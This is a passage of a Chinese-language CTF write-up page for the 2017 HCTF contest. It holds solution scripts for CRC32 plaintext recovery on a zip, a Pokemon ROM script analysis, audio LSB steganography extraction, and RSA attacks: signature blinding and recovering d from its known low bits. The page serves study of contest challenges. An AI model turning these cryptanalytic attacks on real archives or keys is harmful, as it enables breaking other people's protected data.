                i &gt;&gt;= 1
                i ^= poly
            else:
                i &gt;&gt;= 1
        self.table.append(i)
    assert len(self.table) == 256, &quot;table is wrong size&quot;
    \# build reverse table
    if reverse:
        found_none = set()
        found_multiple = set()
        for i in range(256):
            found = \[\]
            for j in range(256):
                if self.table\[j\] &gt;&gt; 24 == i:
                    found.append(j)
            self.table_reverse.append(tuple(found))
            if not found:
                found_none.add(i)
            elif len(found) &gt; 1:
                found_multiple.add(i)
        assert len(self.table_reverse) == 256, &quot;reverse table is wrong size&quot;

def rangess(self, i):
    return &apos;, &apos;.join(map(lambda x: &apos;\[{0},{1}\]&apos;.format(*x), self.ranges(i)))

def ranges(self, i):
    for kg in itertools.groupby(enumerate(i), lambda x: x\[1\] - x\[0\]):
        g = list(kg\[1\])
        yield g\[0\]\[7\], g\[-1\]\[8\]

def calc(self, data, accum=0):
    accum = ~accum
    for b in data:
        accum = self.table\[(accum ^ b) &amp; 0xFF\] ^ ((accum &gt;&gt; 8) &amp; 0x00FFFFFF)
    accum = ~accum
    return accum &amp; 0xFFFFFFFF

def findReverse(self, desired, accum):
    solutions = set()
    accum = ~accum
    stack = \[(~desired,)\]
    while stack:
        node = stack.pop()
        for j in self.table_reverse\[(node\[0\] &gt;&gt; 24) &amp; 0xFF\]:
            if len(node) == 4:
                a = accum
                data = \[\]
                node = node\[1:\] + (j,)
                for i in range(3, -1, -1):
                    data.append((a ^ node\[i\]) &amp; 0xFF)
                    a &gt;&gt;= 8
                    a ^= self.table\[node\[i\]\]
                solutions.add(tuple(data))
            else:
                stack.append(((node\[0\] ^ self.table\[j\]) &lt;&lt; 8,) + node\[1:\] + (j,))
    return solutions

def dfs(self, length, outlist=\[&apos;&apos;\]):
    tmp_list = \[\]
    if length == 0:
        return outlist
    for list_item in outlist:
        tmp_list.extend(\[list_item + chr(x) for x in self.char_set\])
    return self.dfs(length - 1, tmp_list)

def run_reverse(self):
    \# initialize tables
    self.init_tables(self.poly)
    \# find reverse bytes
    desired = self.crc32
    accum = self.accum
    \# 4-byte patch
    if self.length &gt;= 4:
        patches = self.findReverse(desired, accum)
        for patch in patches:
            checksum = self.calc(patch, accum)
            print &apos;verification checksum: 0x{0:08x} ({1})&apos;.format(
                checksum, &apos;OK&apos; if checksum == desired else &apos;ERROR&apos;)
        for item in self.dfs(self.length - 4):
            patch = map(ord, item)
            patches = self.findReverse(desired, self.calc(patch, accum))
            for last\_4\_bytes in patches:
                if all(p in self.char_set for p in last\_4\_bytes):
                    patch.extend(last\_4\_bytes)
                    print &apos;\[find\]: {1} ({0})&apos;.format(
                        &apos;OK&apos; if self.calc(patch, accum) == desired else &apos;ERROR&apos;, &apos;&apos;.join(map(chr, patch)))
    else:
        for item in self.dfs(self.length):
            if crc32(item) == desired:
                print &apos;\[find\]: {0} (OK)&apos;.format(item)
</code></pre><p>def crc32_reverse(crc32, length, char_set=string.printable,
                  poly=0xEDB88320, accum=0):
    &apos;&apos;&apos;</p>
<p> :param crc32: the crc32 you wnat to reverse
 :param length: the plaintext length
 :param char_set: char_set
 :param poly: poly , default 0xEDB88320
 :param accum: accum , default 0
 :return: none
 &apos;&apos;&apos;
    obj = crc32_reverse_class(crc32, length, char_set, poly, accum)
    obj.run_reverse()</p>
<p>def crc32(s):
    &apos;&apos;&apos;</p>
<p> :param s: the string to calculate the crc32
 :return: the crc32
 &apos;&apos;&apos;
    return binascii.crc32(s) &amp; 0xffffffff</p>
<p>from my_crc32 import *
l=[0x251dee02,
0xb890530f,
0x6e6b39df,
0x50f684c3,
0xde41b551,
0x24bd35b6,
0xcef2eda8,
0xba2b1745,
0x1f4c7ea9,
0x58b2bfa9,
0x251dee02,
0xe0f81f1e,
0xbd6fbd41,
0x7342a1f6,
0x665648e9,
0xe7c594b3,
0xa60ffdd0,
0xce2ce80b,
0x22459f2d,
0x6f8a6539,
0x2073a2e4,
0x52fa60a8,
0x80410dda,
0xb7c68f27,
0x6e6b39df,
0xbd598041,
0xaa145d64,
0x16da6b3b,
0x7dd590bc,
0xb9eef5a1,
0xf0b958f0,
0x445a43f7,
0x8bd55271,
0xc0340fe2,
0xc0cd9ee5,
0x7fc7de58,
0x53bfec8a,
0x99b5537b,
0xd68019af,
0x73d7ee30,
0x5fbd3f5e]</p>
<p>for k in l:
    crc32_reverse(k,5)
    print &apos;=======&apos;</p>
<pre><code>```
#You\_know\_the\_bed\_feels\_warmer\_Sleeping\_here\_alone\_You\_know\_I\_dream\_in\_color\_And\_do\_the\_things\_I\_want\_You\_think\_you\_got\_the\_best\_of\_me\_Think\_you\_had\_the\_last\_laugh\_Bet\_you\_think\_that\_everything\_good\_is\_gone
</code></pre><p>crc32&#x7206;&#x7834;&#x5B8C;&#x8FDE;&#x63A5;&#x6210;&#x6587;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x53D1;&#x73B0;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x3002;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x5DF2;&#x77E5;&#x660E;&#x6587;&#x653B;&#x51FB;&#x5373;&#x53EF;&#x3002;&#xFF08;&#x6709;&#x4E9B;&#x4EBA;&#x8BF4;&#x56E0;&#x4E3A;&#x6211;&#x7528;7z&#x538B;&#x7F29;&#x7684;zip&#x6240;&#x4EE5;&#x4ED6;&#x5DF2;&#x77E5;&#x660E;&#x6587;&#x4E00;&#x76F4;&#x653B;&#x51FB;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x6211;&#x8868;&#x793A;&#x662F;&#x6211;&#x6CA1;&#x6709;&#x8003;&#x8651;&#x5230;</p>
<h3 id="pokemon"><a name="pokemon" class="anchor-navigation-ex-anchor" href="#pokemon"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.23. pokemon</h3>
<p>&#x6253;&#x5F00;&#x6E38;&#x620F;&#xFF0C;&#x5927;&#x6728;&#x4F1A;&#x76F4;&#x63A5;&#x548C;&#x4F60;&#x75AF;&#x72C2;&#x6697;&#x793A;</p>
<p>     <a href="http://static.zybuluo.com/LoRexxar/1rpwk7e98onvveez2pez53hu/1510731550298.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/1rpwk7e98onvveez2pez53hu/1510731550298.png" alt="">
     </a><br>     <a href="http://static.zybuluo.com/LoRexxar/nmzohkyjgk20xc6lz1alpdcs/1510731559756.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/nmzohkyjgk20xc6lz1alpdcs/1510731559756.png" alt="">
     </a></p>
<p>&#x5927;&#x6728;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;FLAG&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x9053;&#x9986;&#xFF0C;&#x53BB;&#x6253;&#x8D25;&#x9986;&#x4E3B;&#x3002;<br>&#x5230;&#x7814;&#x7A76;&#x5BA4;&#x9886;&#x7CBE;&#x7075;&#xFF0C;&#x52A9;&#x624B;&#x7ED9;&#x4F60;20&#x4E2A;&#x5947;&#x5F02;&#x7CD6;&#x679C;&#xFF0C;&#x8BA9;&#x4F60;&#x5FEB;&#x901F;&#x5347;&#x7EA7;&#x3002;<br>&#x518D;&#x6B21;&#x63D0;&#x9192;&#x6253;&#x8D25;&#x7B2C;&#x4E00;&#x4E2A;&#x9986;&#x4E3B;&#x3002;<br>     <a href="http://static.zybuluo.com/LoRexxar/wpwhp4q0rfl9ax4fil9e0sea/1510731584084.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/wpwhp4q0rfl9ax4fil9e0sea/1510731584084.png" alt="">
     </a><br>     <a href="http://static.zybuluo.com/LoRexxar/z24p2ndnwb4kvuwkvmeluy28/1510731591892.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/z24p2ndnwb4kvuwkvmeluy28/1510731591892.png" alt="">
     </a><br>     <a href="http://static.zybuluo.com/LoRexxar/k8w9kk3jz08ug046y8rb031g/1510731598750.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/k8w9kk3jz08ug046y8rb031g/1510731598750.png" alt="">
     </a></p>
<p>&#x4E00;&#x8DEF;&#x6253;&#x602A;&#x5347;&#x7EA7;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x9053;&#x9986;<br>     <a href="http://static.zybuluo.com/LoRexxar/dnqsrm6il3xe3tsvt8pf8nfz/1510731610174.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/dnqsrm6il3xe3tsvt8pf8nfz/1510731610174.png" alt="">
     </a></p>
<p>&#x6253;&#x8D25;&#x540E;</p>
<p>     <a href="http://static.zybuluo.com/LoRexxar/2i7q2xzp1ckiw9f6v4m2ltq0/1510731619475.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/2i7q2xzp1ckiw9f6v4m2ltq0/1510731619475.png" alt="">
     </a><br>     <a href="http://static.zybuluo.com/LoRexxar/0jrnucxw212j3xy5ajkgkloj/1510731626196.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/0jrnucxw212j3xy5ajkgkloj/1510731626196.png" alt="">
     </a><br>     <a href="http://static.zybuluo.com/LoRexxar/kn7dlawybbj1jkm0u3eyei31/1510731632341.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/kn7dlawybbj1jkm0u3eyei31/1510731632341.png" alt="">
     </a></p>
<p>&#x9986;&#x4E3B;&#x8BF4;&#x6211;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#x7684;&#xFF0C;&#x60F3;&#x77E5;&#x9053;&#x7684;&#x8BDD;&#x81EA;&#x5DF1;&#x53BB;&#x9006;&#x5411;&#x8FD9;&#x4E2A;rom&#x3002;<br>&#x6B63;&#x6587;&#x5F00;&#x59CB;&#x3002;<br>&#x7528;PPRE&#x5DE5;&#x5177;&#x3002;<br>     <a href="http://static.zybuluo.com/LoRexxar/ew43pwln8whqdfjqn5i860v7/1510731654400.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/ew43pwln8whqdfjqn5i860v7/1510731654400.png" alt="">
     </a></p>
<pre><code>    text_11=&quot;HIIIIIINT(You-really-want-to-get-the-flag-by-submi
    ting-it-one-by-one?)&quot;
    text_12=&quot;HIIIIIINT(Try-to-read-the-scrpit-XP)&quot;
    text_13=&quot;HIIIIIINT(Don&#x2019;t forget to change Brackets to Curly
    Brackets !!!!)&quot;
</code></pre><p>&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x5806;flag&#xFF0C;&#x4F46;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x6B63;&#x786E;&#x7684;&#x3002;<br>&#x63D0;&#x793A;&#x4F60;&#x53BB;&#x770B;&#x811A;&#x672C;&#x3002;<br>&#x9501;&#x5B9A;&#x811A;&#x672C;</p>
<pre><code>    Fanfare 1500
    Lockall
    Faceplayer
    Checkbadge 0 0x800c
    If 0x800c 1
    CheckLR 1 func_5
    Message 0
    CloseMsgOnKeyPress
    TrainerBattle 20 0 0
    CheckTrainerLost 0x800c
    If 0x800c 0
    CheckLR 1 func_6
    Setbdgtrue 0
    ActMainEvent 22
    SetTrainerId 29
    SetTrainerId 50
    Setvar 0x4074 1
    Setflag 402
    Setvar 16648 6
    Setflag 244
    Setflag 403
    Message 1
    SetvarHero 0
    Message 2
    Soundfr 1189
    Fadedef
    Message 3
    Jump func_7
</code></pre><p>&#x5230;func_7</p>
<pre><code>    Setvar 0x8004 378
    Setvar 0x8005 1
    CheckItem3 0x8004 0x8005 0x800c
    If 0x800c 0
    CheckLR 1 func_15
    Callstd 241 7
    Setflag 115
    Clearflag 741
    Setvar 0x8004 378
    Setvar 0x8005 1
    CheckItem3 0x8004 0x8005 0x800c
    If 0x800c 0
    CheckLR 1 func_16
    Message 4
    WaitButton
    CloseMsgOnKeyPress
    Releaseall
    End
</code></pre><p>&#x5206;&#x6790;&#x903B;&#x8F91;&#x53EF;&#x77E5;&#xFF0C;func_16&#x6C38;&#x8FDC;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;<br>&#x5230;func_16</p>
<pre><code>    Message 64
    WaitButton
    CloseMsgOnKeyPress
    Releaseall
    End
</code></pre><p>&#x53D1;&#x73B0;&#x662F;&#x4F7F;&#x7528;64&#x53F7;text&#x5F39;&#x51FA;&#x5BF9;&#x8BDD;&#x6846;</p>
<p><code>text_64=&quot;HCTF(6A0A81AB5F9917B1EEC3A6183C614380)&quot;</code></p>
<pre><code>get flag `HCTF{6A0A81AB5F9917B1EEC3A6183C614380}`
</code></pre><h3 id="newlovesong"><a name="newlovesong" class="anchor-navigation-ex-anchor" href="#newlovesong"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.24. New_Love_Song</h3>
<hr>
<p>&#x4E0D;&#x77E5;&#x9053;&#x5404;&#x4F4D;&#x8FD8;&#x8BB0;&#x4E0D;&#x8BB0;&#x5F97;&#x53BB;&#x5E74;HCTF&#x7684;&#x56FE;&#x7247;&#x9690;&#x5199;&#x9898;&#xFF0C;&#x53BB;&#x5E74;&#x7684;&#x5927;&#x4E00;&#x901A;&#x4FE1;&#x5C0F;&#x5B66;&#x5F1F;&#x4ECA;&#x5E74;&#x5DF2;&#x7ECF;&#x5927;&#x4E8C;&#x4E86;&#x3002;<br>&#x4ED6;&#x4ECE;&#x8BFE;&#x5802;&#x4E0A;&#x5B66;&#x4F1A;&#x4E86;&#x97F3;&#x9891;&#x9690;&#x5199;&#xFF0C;&#x5E76;&#x9009;&#x4E86;&#x5927;&#x5BB6;&#xFF08;wo&#xFF09;LP&#x7684;&#x4E00;&#x9996;&#x6B4C;&#x51C6;&#x5907;&#x5728;&#x53CC;11&#x9001;&#x7ED9;&#x5927;&#x5BB6;&#xFF08;&#x867D;&#x7136;&#x6CA1;&#x51E0;&#x4E2A;&#x4EBA;&#x5F00;&#x5230;&#xFF09;</p>
<h4 id="&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;"><a name="&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><strong>&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;</strong></h4>
<p>&#x9898;&#x76EE;&#x540E;&#x6765;&#x4E5F;&#x653E;&#x8FC7;<strong>hint: concentrate on the waveform &#x6CE8;&#x610F;&#x6CE2;&#x5F62;&#x56FE;</strong><br>&#x7528;<strong>Audacity</strong>&#x6253;&#x5F00;new_love_song.wav,&#x57FA;&#x672C;&#x8FD1;&#x4F3C;&#x4E8E;&#x4E00;&#x79CD;&#x77E9;&#x5F62;:<br>     <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_1.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://olqhuq6wn.bkt.clouddn.com/HCTF_1.png" alt="">
     </a><br>&#x800C;&#x6B63;&#x5E38;&#x7684;&#x97F3;&#x9891;&#x6CE2;&#x5F62;&#x5F80;&#x5F80;&#x90FD;&#x662F;&#x9AD8;&#x4F4E;&#x8D77;&#x4F0F;&#x7684;:<br>     <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_3.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://olqhuq6wn.bkt.clouddn.com/HCTF_3.png" alt="">
     </a><br>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x628A;&#x6CE2;&#x653E;&#x5927;&#xFF0C;&#x80FD;&#x591F;&#x53D1;&#x73B0;&#xFF1A;<br>     <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_2.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://olqhuq6wn.bkt.clouddn.com/HCTF_2.png" alt="">
     </a><br>&#x76F8;&#x9694;&#x7279;&#x5B9A;&#x7684;&#x8DDD;&#x79BB; &#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x6BB5;&#x76F4;&#x7EBF;&#x3002;&#x63A5;&#x89E6;&#x8FC7;&#x7684;&#x4EBA;&#x80AF;&#x5B9A;&#x77E5;&#x9053;&#xFF0C;&#x76F4;&#x7EBF;&#x6CE2;&#x5C31;&#x662F;&#x67D0;&#x4E00;&#x7279;&#x5B9A;&#x7684;&#x503C;<br>&#x80FD;&#x591F;&#x731C;&#x6D4B; &#x80AF;&#x5B9A;&#x6709;&#x4E1C;&#x897F;&#x85CF;&#x5728;&#x5176;&#x4E2D;&#xFF0C;&#x5C1D;&#x8BD5;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x4E00;&#x4E32;01&#x4E32; &#x957F;&#x5EA6;&#x53EF;&#x5F00;&#x65B9; &#xFF0C;&#x53C8;&#x662F;&#x719F;&#x6089;&#x7684;&#x8F6C;&#x6362;&#x4E8C;&#x7EF4;&#x7801;&#xFF0C;&#x626B;&#x63CF;get flag</p>
<h4 id="&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;"><a name="&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><strong>&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;</strong></h4>
<pre><code>clc
clear
close all 

%% load data
wm_sz     = 20000;                             % watermark size
px_sz     = wm_sz/8;                           % number of pixels
im_sz     = sqrt(px_sz);                       % image size
host_new  = audioread (&apos;new\_love\_song.wav&apos;);   % new (watermarked) host signal
host_new  = uint8(255*(host_new + 0.5));       % double \[-0.5 +0.5\] to &apos;uint8&apos; \[0 255\]

%% prepare host
host_bin  = dec2bin(host_new, 8);              % binary host \[n 8\]

%% extract watermark
wm\_bin\_str = host_bin(1:wm_sz, 8);
wm_bin    = reshape(wm\_bin\_str, px_sz , 8);
wm_str    = zeros(px_sz, 1, &apos;uint8&apos;);
for i     = 1:px_sz                           % extract water mark from the first plane of host 
wm_str(i, :) = bin2dec(wm_bin(i, :));      
end
wm        = reshape(wm_str, im_sz , im_sz);

%% show image
imshow(wm)
</code></pre><h3 id="babyrsa"><a name="babyrsa" class="anchor-navigation-ex-anchor" href="#babyrsa"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.25. BabyRSA</h3>
<p>&#x5148;&#x770B;&#x4E0B;&#x9898;&#x76EE;&#x7684;&#x903B;&#x8F91;</p>
<pre><code>M = r * bytes\_to\_long(&apos;hctf{&apos; + sha256(open(&apos;./flag&apos;).read()).hexdigest() + &apos;}&apos;)
S = pow(M, d, n)
</code></pre><p>&#x7A0B;&#x5E8F;&#x63A5;&#x6536; r&#xFF0C;&#x7136;&#x540E;&#x540C; flag &#x76F8;&#x4E58;&#x540E;&#x8BA1;&#x7B97;&#x51FA;&#x5B83;&#x7684;&#x6570;&#x5B57;&#x7B7E;&#x540D;<br>&#x5148;&#x8BF4;&#x4E0B;&#x672C;&#x6765;&#x7684;&#x601D;&#x8DEF;&#xFF0C;flag &#x4E3A; m&#xFF0C;&#x5355;&#x7EAF; flag &#x7684;&#x7B7E;&#x540D;&#x4E3A; S&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x7B7E;&#x540D;&#x4E3A; S&apos;,&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6784;&#x9020; <code>r=R^e</code><br>&#x56E0;&#x4E3A;<br>     <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140246_H97HFB_1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140246_H97HFB_1.jpeg" alt="">
     </a><br>&#x6240;&#x4EE5;</p>
<p>     <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140129_3prZOm_Screenshot.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140129_3prZOm_Screenshot.jpeg" alt="">
     </a><br>e &#x7684;&#x503C;&#x672A;&#x77E5;&#xFF0C;&#x901A;&#x8FC7;&#x7206;&#x7834; e &#x7684;&#x503C;&#x904D;&#x5386;&#x63D0;&#x4EA4; R^e&#xFF0C;&#x518D;&#x6839;&#x636E;&#x4E0A;&#x5F0F;&#x5F97;&#x51FA; flag</p>
<p>&#x4F46;&#x662F;&#x9898;&#x76EE;&#x5FD8;&#x8BB0;&#x5BF9; r &#x8FDB;&#x884C;&#x9650;&#x5236;&#xFF0C;&#x5BFC;&#x81F4;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F20;&#x5165; <code>r=2</code> &#x6765;&#x505A;&#x51FA;<br>     <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140313_QcgiTv_Screenshot.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140313_QcgiTv_Screenshot.jpeg" alt="">
     </a><br>&#x56E0;&#x4E3A; <code>2m &lt; n</code>&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x5BF9; S&apos;^e &#x9664;&#x4EE5; 2 &#x5C31;&#x662F; m</p>
<p>ps: Blue-Whale &#x961F;&#x5E08;&#x5085;&#x7684;&#x89E3;&#x6CD5;<br>     <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140338_1PfOVh_Screenshot.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140338_1PfOVh_Screenshot.jpeg" alt="">
     </a><br>&#x7136;&#x540E;&#x5BF9; m^2 &#x5F00;&#x65B9;&#x5C31;&#x662F; flag &#x4E86;</p>
<h3 id="weakrsa"><a name="weakrsa" class="anchor-navigation-ex-anchor" href="#weakrsa"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.26. WeakRSA</h3>
<p>&#x5DF2;&#x77E5;&#x90E8;&#x5206; d &#x7684;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#xFF0C;&#x662F;&#x53EF;&#x4EE5;&#x8FD8;&#x539F;&#x51FA; d &#x7684;&#xFF0C;<a href="http://honors.cs.umd.edu/reports/lowexprsa.pdf" target="_blank">&#x539F;&#x7406;</a>&#x90E8;&#x5206;&#x3002;&#x4F46;&#x5BF9;&#x4E8E;&#x5DF2;&#x77E5;&#x7684;&#x4F4D;&#x6570;&#x662F;&#x6709;&#x8981;&#x6C42;&#x7684;<br>     <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171114202034_YLmofD_579ADAE3-7403-40C6-AD48-6CF840EE9B3A.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171114202034_YLmofD_579ADAE3-7403-40C6-AD48-6CF840EE9B3A.jpeg" alt="">
     </a><br>&#x5176;&#x4E2D; <code>M=2^k</code>&#xFF0C;k &#x662F; d &#x7684;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x7684;&#x4F4D;&#x6570;<br>&#x51FA;&#x9898;&#x65F6;&#x6CA1;&#x6D4B;&#x8BD5;&#x597D;&#xFF0C;&#x672C;&#x6765;&#x662F;&#x8981;&#x7ED9;&#x7684;&#x4F4D;&#x6570;&#x4E0D;&#x591F;&#x8FD8;&#x539F;&#xFF0C;&#x9700;&#x8981;&#x7206;&#x7834;&#x7684;&#xFF0C;&#x7ED9;&#x4E0B;&#x811A;&#x672C;</p>
<pre><code>#!/usr/bin/python
#\-\*\- coding:utf-8 -*-

import sys, re
from libnum import nroot
from Crypto.Util.number import size

n = 24129492308224479830531863430667763206113500947912894148049103046436751018902380216549212087945014575866175372699327952352562583984599024982322742653474650254469019243745562427155195911292231061633627557914070970650388286259815766552728485153840458510677169495483383264554397982155108666923510839292748291941615629484247125025729363254239159271724680451974211566266307311323012908187153011368890695841034381925365547836453167672856111790684457634738536647974450864723943635507973978195453912898978987904396630176208142995219377309529324099766495068346782530074954504554550936100220114319876296005855618193837568032249
e = 65537

low_d2 = 585021050422437790400309277934736421671174903453118287773262727237276990096608684311252820485289582300237832073420122197911787329400438609843024619449229662477502424617432168933632994437196549098808097025413678738558952555239079729908003264517051128647960060385270607296895534639200191803399174999679917012421
low_bits = 1028
test = pow(3, e, n)

i = 0
prefix = \[\]
for a in range(2):
    for b in range(2):
        prefix.append(str(a) + str(b))

for bf in prefix:
    low_d = int(bin(low_d2)\[2:\], 2)
    for k in xrange(1, e):
        d = (k * n + 1) / e
        d &gt;&gt;= low_bits
        d &lt;&lt;= low_bits
        d |= low_d
        if (e * d) % k == 1:
            if pow(test, d, n) == 3:
                    print k, d
</code></pre><script src="_gitbook_plugin_analytics.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="all.html" class="navigation navigation-prev " aria-label="Previous page: 目前已收录">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="2018qiangwang.html" class="navigation navigation-next " aria-label="Next page: 2018强网杯Web">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"2017HCTF","level":"1.5.1","depth":2,"next":{"title":"2018强网杯Web","level":"1.5.2","depth":2,"path":"articals/2018qiangwang.md","ref":"articals/2018qiangwang.md","articles":[]},"previous":{"title":"目前已收录","level":"1.5","depth":1,"path":"articals/all.md","ref":"articals/all.md","articles":[{"title":"2017HCTF","level":"1.5.1","depth":2,"path":"articals/2017hctf.md","ref":"articals/2017hctf.md","articles":[]},{"title":"2018强网杯Web","level":"1.5.2","depth":2,"path":"articals/2018qiangwang.md","ref":"articals/2018qiangwang.md","articles":[]},{"title":"2018DDCTF","level":"1.5.3","depth":2,"path":"articals/2018ddctf.md","ref":"articals/2018ddctf.md","articles":[]},{"title":"2019全国信安赛","level":"1.5.4","depth":2,"path":"articals/2019national.md","ref":"articals/2019national.md","articles":[]},{"title":"2019DDCTF","level":"1.5.5","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},{"title":"2017全国信安赛","level":"1.5.6","depth":2,"path":"articals/2017national.md","ref":"articals/2017national.md","articles":[]},{"title":"2019西湖论剑预选赛","level":"1.5.7","depth":2,"path":"articals/2019xihulunjian.md","ref":"articals/2019xihulunjian.md","articles":[]},{"title":"实验吧web部分","level":"1.5.8","depth":2,"path":"articals/shiyanbar_web.md","ref":"articals/shiyanbar_web.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","highlight","sitemap","analytics","-search","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of 